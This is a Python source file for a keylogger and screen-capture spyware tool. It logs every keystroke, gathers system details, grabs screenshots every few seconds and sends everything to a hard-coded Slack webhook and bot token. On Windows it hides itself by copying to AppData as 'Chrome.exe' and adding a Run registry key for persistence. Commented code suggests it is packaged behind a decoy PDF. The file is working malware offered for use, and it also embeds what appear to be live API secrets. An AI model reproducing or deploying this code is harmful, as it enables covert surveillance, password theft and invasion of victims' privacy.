#!/usr/bin/env python
import subprocess
import pynput.keyboard
import threading
import psutil
import os
import platform
import json
import sys
import random
import requests
import pyscreenshot
import pathlib
import shutil
from slack import WebClient
from slack.errors import SlackApiError

client = WebClient(token="xoxb-3115147385975-3463858194675-4FIQ3B6j394HCfwcdOYhJ4TZ")

class Elogger:
    def __init__(self, time_interval, webhook_url) -> None:
        self.persistence()
        self.log = ""
        self.screenshot_name = ""
        self.interval = time_interval
        self.webhook_url = webhook_url

    # Function to establish persistency of the application in the windows system that runs it.
    # This is performed by moving the executable to a different location and referencing it in 
    # the registry to maintain persistency on system startup. 
    def persistence(self):
        if os.name == "nt":
            # The application file is copied from the location where it is downloaded to the below specified location.
            # This is done so that if the user deletes the original file, the application can still be accessed in the 
            # system from this new location.
            keep_in = os.environ["appdata"] + "\\Chrome.exe"
            if not os.path.exists(keep_in):
                shutil.copy(sys.executable, keep_in)
                subprocess.call('reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Chrome /t REG_SZ /d "' + keep_in + '"', shell=True)

    # Function to obtain the information of the system running this application.
    def sys_info(self):
        uname = platform.uname()
        self.add_to_log("\n" + "+"*20 + "| System Information |" + "+"*20 + "\n\n")
        self.add_to_log(f"System: {uname.system}\n")
        self.add_to_log(f"Node Name: {uname.node}\n")
        self.add_to_log(f"Release: {uname.release}\n")
        self.add_to_log(f"Version: {uname.version}\n")
        self.add_to_log(f"Machine: {uname.machine}\n")
        self.add_to_log(f"Processor: {uname.processor}\n")
        self.add_to_log(f"Processor: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB\n")
        self.add_to_log("\n" + "+"*20 + "| Events Information |" + "+"*20 + "\n\n")


    def add_to_log(self, data):
        self.log = self.log + data


    def key_event_handler(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = " [ENTER] "
            else:
                current_key = " " + str(key) + " "
        self.add_to_log(current_key)


    def get_screenshot(self):
        # Getting the location to store the screenshot to be captured.
        # and generating a name for the screenshot to be captured.
        storage_location = os.path.join(pathlib.Path(__file__).parent.resolve(), "screenshot_" + str(random.randint(0,1000)) + ".png")

        # Determining family of operating system
        # POSIX for unix-like systems
        if os.name == "posix": 
            img = pyscreenshot.grab()
            img.save(storage_location)
        # NT for windows systems
        elif os.name == "nt": 
            img = pyscreenshot.grab()
            img.save(storage_location)

        # Formatting the storage location of the file to obtain the file name from the absolute location.
        self.screenshot_name = storage_location.split("/")[-1]

        self.post_file_to_slack(self.screenshot_name)

        timer1 = threading.Timer(5, self.get_screenshot)
        timer1.start()

        # os.remove(storage_location) 


    def describe(self):
        self.send_to_slack(self.webhook_url, self.log)
        # self.post_file_to_slack(self.log, self.screenshot_name)
        self.log = ""

        timer = threading.Timer(self.interval, self.describe)
        timer.start()


    def send_to_slack(self, webhook_url, log):
        title = (f"New Incoming Event :trophy:")
        payload = {
            "username": "Event Logger",
            "icon_emoji": ":shipit:",
            "channel" : "#event-logs",
            "attachments": [
                {
                    "color": "#00FF00",
                    "fields": [
                        {
                        "type": "image",
                        "title": title,
                        "value": log,
                        }
                    ]
                }
            ],
        }

        byte_length = str(sys.getsizeof(payload))
        headers = {'Content-Type': "application/json", 'Content-Length': byte_length}
        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
        if response.status_code != 200:
            raise Exception(response.status_code, response.text)


    def post_file_to_slack(self, screenshot_name):
        try:
            # Call the files.upload method using the WebClient
            # Uploading files requires the `files:write` scope
            result = client.files_upload(
                channels="event-logs",
                initial_comment= screenshot_name + " :smile:",
                file=screenshot_name,
            )
            # Log the result
            logger.info(result)

        except SlackApiError as e:
            logger.error("Error uploading file: {}".format(e))


    def execute(self):
        self.sys_info()
        self.get_screenshot()

        keyboard_listener = pynput.keyboard.Listener(on_press=self.key_event_handler)
        with keyboard_listener:
            self.describe()
            keyboard_listener.join()

""" Get absolute path to resource, works for dev and for PyInstaller """
# try:
#     # PyInstaller creates a temp folder and stores path in _MEIPASS
#     base_path = sys._MEIPASS
# except Exception:
#     base_path = os.path.abspath(".")

# pdf_to_run = os.path.join(base_path, "pdf_file.pdf")
# subprocess.Popen(pdf_to_run, shell=True)
    
try:
    events_logger = Elogger(10, "https://hooks.slack.com/services/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")
    events_logger.execute()
except Exception:
    sys.exit()
